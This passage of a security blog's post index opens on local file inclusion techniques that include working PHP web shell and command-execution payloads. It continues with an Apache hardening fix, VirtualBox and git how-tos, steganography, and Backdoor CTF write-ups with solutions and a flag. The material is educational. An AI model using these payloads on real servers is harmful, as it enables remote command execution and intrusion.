echo shell_exec($_GET[&apos;cmd&apos;]);?&gt; Another payload can be &lt;?php phpinfo(); die();?&gt;, the die statement will prevent the execution of the rest of the script or the execution of the incorrectly decoded extension appended to the stream. A more usable PHP payload webshell: 1&lt;form action=&quot;&lt;?=$_SERVER[&apos;REQUEST_URI&apos;]?&gt;&quot; method=&quot;POST&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;x&quot; value=&quot;&lt;?=htmlentities($_POST[&apos;x&apos;])?&gt;&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;cmd&quot;&gt;&lt;/form&gt;&lt;pre&gt;&lt;? echo `&#123;$_POST[&apos;x&apos;]&#125;`; ?&gt;&lt;/pre&gt;&lt;? die(); ?&gt; To directly execute a command the data request + payload may be: data:,&lt;?system($_GET['x']);?&gt;&amp;x=ls or data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&amp;x=ls. The best way to successfully execute the payload is to base64 it and then URL encode it. zip:// and phar:// Archive a php script into a zip or a phar (or others archive with others wrappers), send the archive and tell which file has to be read: zip://archive.zip#file.php. /proc/self/environ To come. /proc/self/fd/ To come. Session Files To come. Including images You can append some php code at the end of an image and upload it or include it. Others I invite you to discover more attack vectors here. And don't forget that those methods can be combined.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"vulnerability","slug":"vulnerability","permalink":"https://rawsec.ml/tags/vulnerability/"},{"name":"lfi","slug":"lfi","permalink":"https://rawsec.ml/tags/lfi/"}]},{"title":"Nikto : protect your Apache server against a LFI vulnerability","slug":"nikto-protecting-LFI","date":"2016-07-06T22:00:00.000Z","updated":"2017-02-07T18:23:37.222Z","comments":true,"path":"en/nikto-protecting-LFI/","link":"","permalink":"https://rawsec.ml/en/nikto-protecting-LFI/","excerpt":"","text":"Goal How to protect your apache server against a LFI vulnerability that can be found with Nikto . 1/autohtml.php?op=modload&amp;mainfile=x&amp;name=/etc/passwd : php-proxima 6.0 and below allows arbitrary files to be retrieved. Nikto test https://raw.githubusercontent.com/sullo/nikto/master/program/databases/db_tests 1&quot;000548&quot;,&quot;9028&quot;,&quot;5&quot;,&quot;/autohtml.php?op=modload&amp;mainfile=x&amp;name=/etc/passwd&quot;,&quot;GET&quot;,&quot;root:&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;php-proxima 6.0 and below allows arbitrary files to be retrieved.&quot;,&quot;&quot;,&quot;&quot; Protection To do so, you have to disable trailing pathname by disabling the AcceptPathInfo directive: For example edit your vhost configuration: vim /etc/apache2/vhosts.d/vhostname.conf (openSUSE) vim /etc/apache2/sites-available/example.com.conf (Debian/Ubuntu) vim /etc/httpd/sites-available/example.com.conf (CentOS/RHEL/Fedora) And in the &lt;Directory&gt; section add the directive AcceptPathInfo Off or turn it to Off if already existing Save your config file Restart apache: systemctl restart apache2.service (openSUSE) service apache2 restart (Debian/Ubuntu) systemctl restart httpd.service (CentOS/RHEL/Fedora) apachectl restart (generic)","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"vulnerability","slug":"vulnerability","permalink":"https://rawsec.ml/tags/vulnerability/"},{"name":"lfi","slug":"lfi","permalink":"https://rawsec.ml/tags/lfi/"},{"name":"apache","slug":"apache","permalink":"https://rawsec.ml/tags/apache/"}]},{"title":"Virtualbox : Export from VirtualBox and import to VMware ESXI","slug":"virtualbox-export-vmware-esxi","date":"2016-07-05T22:00:00.000Z","updated":"2017-02-07T18:23:37.282Z","comments":true,"path":"en/virtualbox-export-vmware-esxi/","link":"","permalink":"https://rawsec.ml/en/virtualbox-export-vmware-esxi/","excerpt":"","text":"Version of software used: VirtualBox 5.0.22 vSphere Client 5.1 VMware ESXI 5.1 Export to OVA/OVF From VirtualBox export the virtual machine : &quot;File&quot; &gt; &quot;Export Appliance&quot;. Then choose OVF 1.0 format and don't check the write manifest file box. You now have a .ova file. Edit OVF VMware ESXI is not good at all to import virtual machine from other virtual manager. So if you try to directly import your ova file you'll get an error message: The OVF package requires unsupported hardware. Details: Line 25: Unsupported hardware family 'virtualbox-2.2'. To fix it, unzip the .ova file (ignore extracting error), go into the folder and edit the .ovf file. Replace the following line: 1&lt;vssd:VirtualSystemType&gt;virtualbox-2.2&lt;/vssd:VirtualSystemType&gt; with: 1&lt;vssd:VirtualSystemType&gt;vmx-07&lt;/vssd:VirtualSystemType&gt; Note : if you didn't check write manifest file you won't have checksum problem, but if you did the easiest is to remove the .mf file. You can also re-generate the checksum sha1sum file.ovf and replace the value in the .mf file. Import into ESXI You can now try to import the VM: &quot;File&quot; &gt; &quot;Deploy OVF Template&quot; &gt; Select the freshly edited .ovf (ot the original .ova) You may get an error: The OVF package requires unsupported hardware. Details: Line 74: OVF hardware element 'ResourceType' with instance ID '6'. No support for the virtual hardware device type '35'. To fix it, edit the .ovf file again. Go to the line mentioned in the error message and remvoe the whole item: 12345678910&lt;Item&gt; &lt;rasd:AddressOnParent&gt;3&lt;/rasd:AddressOnParent&gt; &lt;rasd:AutomaticAllocation&gt;false&lt;/rasd:AutomaticAllocation&gt; &lt;rasd:Caption&gt;sound&lt;/rasd:Caption&gt; &lt;rasd:Description&gt;Sound Card&lt;/rasd:Description&gt; &lt;rasd:ElementName&gt;sound&lt;/rasd:ElementName&gt; &lt;rasd:InstanceID&gt;6&lt;/rasd:InstanceID&gt; &lt;rasd:ResourceSubType&gt;ensoniq1371&lt;/rasd:ResourceSubType&gt; &lt;rasd:ResourceType&gt;35&lt;/rasd:ResourceType&gt;&lt;/Item&gt; That can be sound card, cd drive or some other optional drive. Note : if you still want to use .mf file don't forget to update the checksum. You can now try to import the .ovf again. Some other weird errors can occur but I won't be able to help you more... Note : if you use Guest Additions don't forget to change them (VirtualBox Guest Additions &gt; VMware Guest Tools).","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"https://rawsec.ml/tags/system/"},{"name":"virtualization","slug":"virtualization","permalink":"https://rawsec.ml/tags/virtualization/"}]},{"title":"Virtualbox : change the UUID of a virtual disk","slug":"virtualbox-change-virtual-disk-uuid","date":"2016-07-05T22:00:00.000Z","updated":"2017-02-07T18:23:37.275Z","comments":true,"path":"en/virtualbox-change-virtual-disk-uuid/","link":"","permalink":"https://rawsec.ml/en/virtualbox-change-virtual-disk-uuid/","excerpt":"","text":"To change the UUID of a virtual disk: 1VBoxManage internalcommands sethduuid &lt;filepath&gt; [&lt;uuid&gt;] Examples With a vdi disk : VBoxManage internalcommands sethduuid disk.vdi With a vmdk disk and choosing the UUID : VBoxManage internalcommands sethduuid disk.vmdk e4f44ef2-524a-1d28-b74b-f7fea9bc855","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"https://rawsec.ml/tags/system/"},{"name":"virtualization","slug":"virtualization","permalink":"https://rawsec.ml/tags/virtualization/"}]},{"title":"Writeups - Forensic - BusyBee","slug":"BackdoorCTF-2016-writeups-forensics-busybee","date":"2016-07-01T22:00:00.000Z","updated":"2017-03-21T22:25:31.642Z","comments":true,"path":"en/BackdoorCTF-2016-writeups-forensics-busybee/","link":"","permalink":"https://rawsec.ml/en/BackdoorCTF-2016-writeups-forensics-busybee/","excerpt":"","text":"Informations Version Date By Version Comment 05/06/2016 noraj 1.0 Creation CTF Name : BackdoorCTF 2016 Website : https://backdoor.sdslabs.co Type : Online Format : Jeopardy CTF Time : link Name BusyBee Category Forensic Wording A deadly virus is killing bees in Busybee's village Busybox, India. Unfortuantely, you have to go to the village to fight the infection. Get the flag virus out of the infected files. Village address: http://hack.bckdr.in/BUSYBEE/infected.tar Created by: Ashish Chaudhary Data(s) link Solution Methodology Untar the datas: tar xaf infected.tar List the content of the directory: 123456789ls -AgGtotal 2332drwxr-xr-x 2 4096 Jun 3 18:13 2b0fbc0e1ac044737fd881cff8164bb5a2c7bfbf90c40c87de3c3435f2c6a94edrwxr-xr-x 4 4096 Jul 2 19:01 983179bdb58ea980ec1fe7c45f63571d49b140bdd629f234be9c00a6edd8a4a7drwxr-xr-x 2 4096 Jun 3 18:13 d51a083a3b01fe8c58086903595b91fc975de59a9e9ececec755df384a181026-rw-r--r-- 1 1344 Jun 3 18:13 eaa21323de5e2cce7078df3af4dd292181114dfc94be761b948657efbe3af26b.json-rw-r--r-- 1 2362880 Jun 6 08:17 infected.tar-rw-r--r-- 1 373 Jan 1 1970 manifest.json-rw-r--r-- 1 106 Jan 1 1970 repositories Display repositories file, it looks interesting: 12cat repositories&#123;&quot;busybox-1.24.1-infected&quot;:&#123;&quot;latest&quot;:&quot;983179bdb58ea980ec1fe7c45f63571d49b140bdd629f234be9c00a6edd8a4a7&quot;&#125;&#125; 983179bdb58ea980ec1fe7c45f63571d49b140bdd629f234be9c00a6edd8a4a7: show us which folder is infected, so display its content: 12345ls -AgG 983179bdb58ea980ec1fe7c45f63571d49b140bdd629f234be9c00a6edd8a4a7/total 1020-rw-r--r-- 1 3 Jun 3 18:13 VERSION-rw-r--r-- 1 907 Jun 3 18:13 json-rw-r--r-- 1 1035776 Jun 3 18:13 layer.tar Go into 983179bdb58ea980ec1fe7c45f63571d49b140bdd629f234be9c00a6edd8a4a7, untar layer.tar, and display: 12345678910111213141516171819cd 983179bdb58ea980ec1fe7c45f63571d49b140bdd629f234be9c00a6edd8a4a7tar xaf layer.tarls -AgGR.:total 1028-rw-r--r-- 1 3 Jun 3 18:13 VERSIONdrwxr-xr-x 2 4096 Jun 3 18:11 bin-rw-r--r-- 1 907 Jun 3 18:13 json-rw-r--r-- 1 1035776 Jun 3 18:13 layer.tardrwxr-xr-x 2 4096 Jun 3 18:09 root./bin:total 2016-rwxr-xr-x 2 1031328 Jun 3 18:11 cat-rwxr-xr-x 2 1031328 Jun 3 18:11 sha1sum./root:total 4-rw------- 1 44 Jun 3 18:12 .ash_history root/.ash_history looks intersting: 12cat root/.ash_historynot so easy bru - the infections is intense ... but is not. So let's see what are the binaries: 123cat bin/sha1sum[...]THIS IS WHAT YOU ARE LOOKING FOR: 0n3_n00b_ru1n5_0n3_hundr3d_pr05 The last line of the binary shows us what we are looking for 0n3_n00b_ru1n5_0n3_hundr3d_pr05 (1337 : one noob ruins one hundred pros) Try to sha256 it: 12echo -n &quot;0n3_n00b_ru1n5_0n3_hundr3d_pr05&quot; | sha256sum0743a3265649702df53b083056b2f426d20e449cd68210384ff0ff159f3867fa PS : You could have seen that the repository has the structure of a docker image and try to load and build it. Flag Since Backdoor is an always-online CTF platform, and not a one time contest, we kindly request you to not publish flags for the challenges in your writeups. Writeups are an excellent way to share knowledge and help others learn. In Backdoor, challenges are shifted from a contest to the Practice section, where people can continue to attempt them after the contest is over. It would be very unfair to participants if the flags for the problems were easily available in writeups online. Hence, we kindly request to not publish flags of the problems that you solve. Here is an example of an excellent writeup which refrains from giving the complete solution.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"Hardened Tor Browser with Selfrando","slug":"hardened-tor-browser-selfrando","date":"2016-06-20T22:00:00.000Z","updated":"2017-02-07T18:23:37.245Z","comments":true,"path":"en/hardened-tor-browser-selfrando/","link":"","permalink":"https://rawsec.ml/en/hardened-tor-browser-selfrando/","excerpt":"","text":"6 June 2016, the Tor Project announced a hardened version of Tor Browser: 6.5a1-hardened. Here some links: Download page for hardened builds (only avaible for Linux at this time). Distribution directory. Official announcement by the Tor Project. Firefox security updates In order to prevent intelligence agencies to de-anonymize Tor users using exploits, Tor hardened version includes Selfrando. Selfrando is a load-time randomization software that aims to improve security over standard address space layout randomization (ASLR) techniques. Selfrando doesn't overhead performance very much (less than 1%) and doesn't need too many chnages in the existing Tor Browser code. For more details, researcehrs from University of California published a report entitled Selfrando: Securing the Tor Browser against De-anonymization Exploits.","categories":[{"name":"news","slug":"news","permalink":"https://rawsec.ml/categories/news/"},{"name":"security","slug":"news/security","permalink":"https://rawsec.ml/categories/news/security/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"news","slug":"news","permalink":"https://rawsec.ml/tags/news/"},{"name":"tor","slug":"tor","permalink":"https://rawsec.ml/tags/tor/"}]},{"title":"Git changing remote URLs","slug":"git-changing-remote-urls","date":"2016-06-19T22:00:00.000Z","updated":"2017-02-07T18:23:37.272Z","comments":true,"path":"en/git-changing-remote-urls/","link":"","permalink":"https://rawsec.ml/en/git-changing-remote-urls/","excerpt":"","text":"git remote set-url &lt;name&gt; &lt;newurl&gt; command changes existing remote repository URL. For example, to switch from a github repository from HTTPS to SSH: Change the current working directory to local project. List existing remotes in order to get the name of the remote to change. 123git remote -vorigin https://github.com/shark-oxi/RawSec.git (fetch)origin https://github.com/shark-oxi/RawSec.git (push) Change remote's URL from HTTPS to SSH with the git remote set-url command. 1git remote set-url origin git@github.com:shark-oxi/RawSec.git Verify that the remote URL has changed. 123git remote -vorigin git@github.com:shark-oxi/RawSec.git (fetch)origin git@github.com:shark-oxi/RawSec.git (push)","categories":[{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/categories/misc/"}],"tags":[{"name":"git","slug":"git","permalink":"https://rawsec.ml/tags/git/"}]},{"title":"Hide AES-256 encrypted zip file in a JPEG image","slug":"hide-encrypted-zip-image","date":"2016-06-12T22:00:00.000Z","updated":"2017-02-07T18:23:37.272Z","comments":true,"path":"en/hide-encrypted-zip-image/","link":"","permalink":"https://rawsec.ml/en/hide-encrypted-zip-image/","excerpt":"","text":"This how-to was made for Linux user. The user will need p7zip, exiv2 and optionally exif, exiftool, unzip. Create an AES-256 encrypted zip file 7z (p7zip for Linux) can produce zip-format archives with encryption scheme. To add file.txt to archive.zip and cipher zip data with AES-256 : 17za a -tzip -pTHE_PASSWORD -mem=AES256 archive.zip file.txt To uncompress unzip -p THE_PASSWORD archive.zip or 7za e archive.zip and provide password. It may also work with GUI archive manager. Hide the zip into the image To do so, concatenate the zip an image data: 1cat original_image.jpg archive.zip &gt; new_image.jpg Now check file type: 12file new_image.jpgnew_image.jpg: JPEG image data, JFIF standard 1.02 It seems like a normal jpeg image. But make a strings on it and see files that are in the zip (filenames in the zip are not ciphered, only their content is): 123456789strings new_image.jpg[...].YybM]Y]file.txtkBKMS!file.txt The image is an archive too, so it can be extracted. Let's compare original zip archive and the jpeg one. Original zip archive: 123unzip archive.zipArchive: archive.zip skipping: file.txt need PK compat. v5.1 (can do v4.5) Jpeg zip archive: 12345unzip new_image.jpgArchive: new_image.jpgwarning [new_image.jpg]: 35068 extra bytes at beginning or within zipfile (attempting to process anyway) skipping: file.txt need PK compat. v5.1 (can do v4.5) To really extract the archive use unzip -p, 7za e or a GUI archive manager like explained in the previous part. Hide the archive password into image metadata Here we'll hide password in image comment, it's not safe at all but it's just for fun. We'll hide the real password into jpeg comment and a fake password into exif user comment. Hide the password into jpeg comment: 1exiv2 -c THE_PASSWORD modify new_image.jpg Hide a fake password into exif user comment: 1exiv2 -M&quot;set Exif.Photo.UserComment FAKE_PASSWORD&quot; new_image.jpg Jpeg comment can be seen with: 12exiv2 -p c new_image.jpgTHE_PASSWORD Exif user comment can be seen with: 123exiv2 -p t new_image.jpgExif.Image.ExifTag Long 1 26 Exif.Photo.UserComment Undefined 37 FAKE_PASSWORD More datails are avaible at exiv2 manpage. Why two different passwords and two different comments As I said put the password in metadata is not safe, everyone aware of steganography will know how to find it. But we can get confused more novice people. Novice in steganography often use only default behaviour of tools commands like exiftool, exif or less often exiv2. exif and exiv2 default behaviour without options show only exif data but exiftool will show Exif, IPTC, XMP and image type dependent data. So novice that will only run exif new_image.jpg or exiv2 new_image will only see the fake password hidden in exif user comment: 12exif new_image.jpg | grep -i commentUser Comment |FAKE_PASSWORD 12exiv2 new_image.jpg | grep -i commentExif comment : FAKE_PASSWORD But 123exiftool new_image.jpg | grep -i commentUser Comment : FAKE_PASSWORDComment : THE_PASSWORD","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"stegano","slug":"stegano","permalink":"https://rawsec.ml/tags/stegano/"},{"name":"crypto","slug":"crypto","permalink":"https://rawsec.ml/tags/crypto/"}]},{"title":"Security related Operating Systems","slug":"security-related-os","date":"2016-06-08T22:00:00.000Z","updated":"2017-02-17T23:00:00.000Z","comments":true,"path":"en/security-related-os/","link":"","permalink":"https://rawsec.ml/en/security-related-os/","excerpt":"","text":"This list is available as: a web page: http://rawsec.ml/en/security-related-os/ a git file: https://github.com/noraj1337/RawSec/blob/posts-sources/security-related-os.mkd Maintained OS Based on Description Link Alpine Linux Independent minimalist Alpine Linux BackBox Ubuntu penetration testing and security lab BackBox BlackArch Linux ArchLinux penetration testing and security lab BlackArch Linux Bugtraq-II Blackwidow Ubuntu / Debian penetration testing and security lab Bugtraq-II Blackwidow CAINE Ubuntu digital forensics CAINE Cyborg Essentials Debian penetration testing and security lab Cyborg Essentials Cyborg Hawk Linux Ubuntu penetration testing and security lab Cyborg Hawk Linux DEFT Ubuntu digital forensics DEFT DracOS Linux From Scratch penetration testing and security lab DracOS Fedora Security Lab Fedora penetration testing and security lab Fedora Security Lab Kali Linux Debian penetration testing and security lab Kali Linux Knoppix Debian penetration testing and security lab Knoppix Linux Kodachi Debian privacy and anonymity Linux Kodachi Matriux Debian penetration testing and security lab Matriux NodeZero Ubuntu penetration testing and security lab NodeZero NST Fedora network security monitoring and analysis NST Parrot Security OS Debian penetration testing and security lab Parrot Security OS Pentoo Gentoo penetration testing and security lab Pentoo Qubes OS Fedora security by compartmentalization (VM) Qubes OS REMnux Debian malware analysts and reverse-engineering REMnux Security Onion Ubuntu network security monitoring and analysis Security Onion Subgraph OS Debian security by compartmentalization (container) Subgraph OS Tails Debian privacy and anonymity Tails TENS Thinstation privacy and stealth TENS URIX OS openSUSE penetration testing, security lab and security-focused URIX OS WEAKERTHAN Linux Debian penetration testing and security lab WEAKERTHAN Linux Whonix Debian privacy and anonymity Whonix Wifislax Slackware penetration testing and security lab Wifislax No more maintained OS Based on Description Link Blackbuntu Ubuntu penetration testing and security lab Blackbuntu GnackTrack Ubuntu penetration testing and security lab GnackTrack Live Hacking Ubuntu penetration testing and security lab Live Hacking STD Debian penetration testing and security lab STD Project transfered ArchAssault is now BlackArch Linux Backtrack is now Kali Linux","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"anonymity","slug":"anonymity","permalink":"https://rawsec.ml/tags/anonymity/"},{"name":"pentest","slug":"pentest","permalink":"https://rawsec.ml/tags/pentest/"},{"name":"privacy","slug":"privacy","permalink":"https://rawsec.ml/tags/privacy/"}]},{"title":"How to install VirtualBox Guest Additions on Debian-based Linux distributions","slug":"install-virtualbox-guest-additions-debian","date":"2016-06-08T22:00:00.000Z","updated":"2017-02-07T18:23:37.272Z","comments":true,"path":"en/install-virtualbox-guest-additions-debian/","link":"","permalink":"https://rawsec.ml/en/install-virtualbox-guest-additions-debian/","excerpt":"","text":"Here is how to install VirtualBox Guest Additions on Debian-based Linux distributions like Parrot Security OS, Kali Linux, Tails, Whonix or REMnux. With VirtualBox Guest Additions it become possible to resize desktop while resizing the VirtualBox window or share a folder between host and guest. Download and mount Start the VM In VirtualBox window, in Devices menu, choose Insert Guest Additions CD image If there are not yet here, choose Download and Insert Mount the CD: mount /media/cdrom/ Install VirtualBox Guest Additions Open a terminal and as root write: 12345apt-get install build-essential dkms gcc linux-headers-`uname -r`mkdir /tmp/vboxaddcp -r /media/cdrom0/* /tmp/vboxadd/cd /tmp/vboxadd/./VBoxLinuxAdditions.run And then restart: shutdown -r now","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"},{"name":"debian","slug":"linux/debian","permalink":"https://rawsec.ml/categories/linux/debian/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"https://rawsec.ml/tags/system/"},{"name":"virtualization","slug":"virtualization","permalink":"https://rawsec.ml/tags/virtualization/"},{"name":"virtualbox","slug":"virtualbox","permalink":"https://rawsec.ml/tags/virtualbox/"},{"name":"debian","slug":"debian","permalink":"https://rawsec.ml/tags/debian/"}]},{"title":"Pastejacking vs clipboard hijacking","slug":"pastejacking-vs-clipboard-hijacking","date":"2016-06-01T22:00:00.000Z","updated":"2017-02-07T18:23:37.275Z","comments":true,"path":"en/pastejacking-vs-clipboard-hijacking/","link":"","permalink":"https://rawsec.ml/en/pastejacking-vs-clipboard-hijacking/","excerpt":"","text":"Clipboard hijacking It as been possible for a long time to use css to append malicious content to the clipboard. Users doesn't notine anything and may execute unwanted commands. This type of attack is called clipboard hijacking and is dangerous when the user copies something from the web inside his terminal. Pastejacking Dylan Ayrey, security researcher, published a variation of this attack that use only JavaScript. Difference with clipboard hijacking, is that pastejacking can copy text after an event. With clipboard hijacking user has to copy the full text but with pastejacking one character is enough. Versus Pastejacking is more powerfull but is easier to block : user has just to block JavaScript in his browser or use a plugin such as NoScript. Clipbboard hijacking is less threatening but harder to block, user will need an add-on for his terminal, for example, that blocks copied text containing line feeds.","categories":[{"name":"news","slug":"news","permalink":"https://rawsec.ml/categories/news/"},{"name":"security","slug":"news/security","permalink":"https://rawsec.ml/categories/news/security/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"news","slug":"news","permalink":"https://rawsec.ml/tags/news/"}]},{"title":"Writeups - Crypto - Oups it's all mixed","slug":"BackdoorCTF-2016-writeups-crypto-oups-its-all-mixed","date":"2016-05-25T22:00:00.000Z","updated":"2017-02-07T18:23:37.105Z","comments":true,"path":"en/BackdoorCTF-2016-writeups-crypto-oups-its-all-mixed/","link":"","permalink":"https://rawsec.ml/en/BackdoorCTF-2016-writeups-crypto-oups-its-all-mixed/","excerpt":"","text":"Informations Version Date By Version Comment 03/05/2016 noraj 1.0 Creation Name Oups it's all mixed Category Cryptography Wording Decipher the following flag: eGqaelr557dK4BbK47dS17dK68cu2PVPdydK2TtR5lKC Data(s) +aAzZbByYcCxXdDwWeEvV9876543210fFuUgGtThHsSiIrRjJqQkKpPlLoOmMnN/ Equipment(s) A computer with an OS (preferably UNIX) Hint(s) The name title is a hint. Help Base64 Difficulty Easy / Medium Solution Methodology Identify that is a base64 string Decode the base64 string and observe only garbage Look at the provided data and analyse it Identify the data as a base64 alphabet (64 characters = 26 lowercase letters + 26 uppercase letters + 10 number + + + /) Realize that the alphabet is non standard but a mixed alphabet Write a script that will translate one alphabet to the other and pick up the output standard base64 string and then decode it Some scrip examples below. Python 2 123456789101112131415#!/usr/bin/python2 # made with python 2.7.9import base64import sysimport stringbase64_mixed_alphabet = '+aAzZbByYcCxXdDwWeEvV9876543210fFuUgGtThHsSiIrRjJqQkKpPlLoOmMnN/'base64_standard_alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'s = 'eGqaelr557dK4BbK47dS17dK68cu2PVPdydK2TtR5lKC's_unmixed = s.translate(string.maketrans(base64_mixed_alphabet, base64_standard_alphabet))s_unb64 = base64.urlsafe_b64decode(s_unmixed) Python 3 1234567891011121314#!/usr/bin/python3 # made with python 3.4.1import base64base64_mixed_alphabet = '+aAzZbByYcCxXdDwWeEvV9876543210fFuUgGtThHsSiIrRjJqQkKpPlLoOmMnN/'base64_standard_alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'s = 'eGqaelr557dK4BbK47dS17dK68cu2PVPdydK2TtR5lKC's_unmixed = s.translate(str.maketrans(base64_mixed_alphabet, base64_standard_alphabet))s_unb64 = base64.urlsafe_b64decode(s_unmixed.encode('utf-8'))s_unb64 = s_unb64.decode('utf-8') # byte to string Bash 12# made with bash 4.2.47echo \"eGqaelr557dK4BbK47dS17dK68cu2PVPdydK2TtR5lKC\" | tr '+aAzZbByYcCxXdDwWeEvV9876543210fFuUgGtThHsSiIrRjJqQkKpPlLoOmMnN/' 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' | base64 -di &amp;&amp; echo \"\\n\" Flag FLAG{Yesthatisjustabase64string}","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"crypto","slug":"crypto","permalink":"https://rawsec.ml/tags/crypto/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"Writeups - Crypto - MindBlown","slug":"BackdoorCTF-2016-writeups-crypto-mindblown","date":"2016-05-25T22:00:00.000Z","updated":"2017-02-27T19:19:12.771Z","comments":true,"path":"en/BackdoorCTF-2016-writeups-crypto-mindblown/","link":"","permalink":"https://rawsec.ml/en/BackdoorCTF-2016-writeups-crypto-mindblown/","excerpt":"","text":"Informations Version Date By Version Comment 05/06/2016 noraj 1.0 Creation CTF Name : BackdoorCTF 2016 Website : https://backdoor.sdslabs.co Type : Online Format : Jeopardy CTF Time : link Name MindBlown Category Cryptography Wording Recently Chintu made a login service to secure his flag. But we managed to get the authentification logic to be found here. Can you help us to get his flag? Find the login form here. Data(s) 1234567891011121314151617181920212223242526var express = require('express');var app = express();var port = process.env.PORT || 9898;var crypto = require('crypto');var bodyParser = require('body-parser')var salt = 'somestring';var iteration = /// some number here;var keylength = // some number here;app.post('/login', function (req, res) &#123; var username = req.body.username; var password = req.body.password; if (username !== 'chintu') &#123; res.send('Username is wrong'); return; &#125; if (crypto.pbkdf2Sync(password, salt, iteration, keylength).toString() === hashOfPassword) &#123; if (password === 'complexPasswordWhichContainsManyCharactersWithRandomSuffixeghjrjg') &#123; // some logic here and return something &#125; else &#123; // return flag here &#125; &#125; else &#123; res.send('Password is wrong'); &#125;&#125;); Equipment(s) A computer with an OS (preferably UNIX) Internet access Hint(s) None Help None Difficulty Medium Solution Methodology Take a look at the logic source code. if (username !== 'chintu') clearly indicates that the username is chintu if (password === 'complexPasswordWhichContainsManyCharactersWithRandomSuffixeghjrjg') let us believe that the password is complexPasswordWhichContainsManyCharactersWithRandomSuffixeghjrjg but it's not. If you try this password you will get this message : Hacker got you! I know my password was leaked, won't give you my flag. In fact, that is the else statement that returns the flag. So we have to validate the root if statement if (crypto.pbkdf2Sync(password, salt, iteration, keylength).toString() === hashOfPassword) with another password than complexPasswordWhichContainsManyCharactersWithRandomSuffixeghjrjg. We can see that crypto.pbkdf2Sync is kind of a hash method. So let's look for more information about it. (it's a Node.js / JavaScript method) We'll try to create a PBKDF2 + HMAC hash collision. For more details see the PBKDF2 + HMAC collision explanation part below. Enter the collision password e6~n22k81&lt;[p&quot;k5hhV6*. Here you are. PBKDF2 + HMAC collision explanation Inspired by mathiasbynensbe PBKDF2 is a widely used method to derive a key. Minimal arguments are: password salt number of iterations key length As said in RFC2898, default is to use HMAC with SHA-1 hash function. HMAC has an interesting property: if a supplied key is longer than the block size of the hash function that’s being used, it uses the hash of the key rather than the key itself. SHA-1 has a block size of 512 bits, which equals 64 bytes. So in this case, if the supplied key takes up more than 64 bytes, then SHA1(key) is used as the key. In this challenge password is 65 bytes long: 12echo -n 'complexPasswordWhichContainsManyCharactersWithRandomSuffixeghjrjg' | wc -c65 Note that the collision password always has a length of 20 characters, because SHA1 hashes always consist of exactly 40 hexadecimal digits representing 20 bytes. One byte, i.e. two hexadecimal digits are used for each character in the colliding password. Here, how to generate the collision password: 12echo -n 'complexPasswordWhichContainsManyCharactersWithRandomSuffixeghjrjg' | sha1sum | xxd -r -pe6~n22k81&lt;[p\"k5hhV6* Note that: -n option of echo do not output the trailing newline else generated password would be wrong. xxd - make a hexdump or do the reverse. -r or -revert: convert hexdump into binary. -p or -ps or -postscript or -plain: output in postscript continuous hexdump style. Also known as plain hexdump style. -r -p: Use the combination -r -p to read plain hexadecimal dumps without line number information and without a particular column layout. That is why complexPasswordWhichContainsManyCharactersWithRandomSuffixeghjrjg and e6~n22k81&lt;[p&quot;k5hhV6* have the same PBKDF2-HMAC-SHA1 hash. There is an infinity of PBKDF2-HMAC-SHA1 collisions. While it’s easy to find a collision for any given string larger than 64 bytes (just run the above Bash command), it gets trickier if you want the colliding password to consist of readable ASCII characters only. SHA1 hashes can contain any hexadecimal digits, and converting such a hash back into a string is likely to result in at least one character outside of the printable ASCII range ([\\x20-\\x7E]). To see how to choose a prefix for the colliding password go to [link][mathiasbynensbe. Flag Since Backdoor is an always-online CTF platform, and not a one time contest, we kindly request you to not publish flags for the challenges in your writeups. Writeups are an excellent way to share 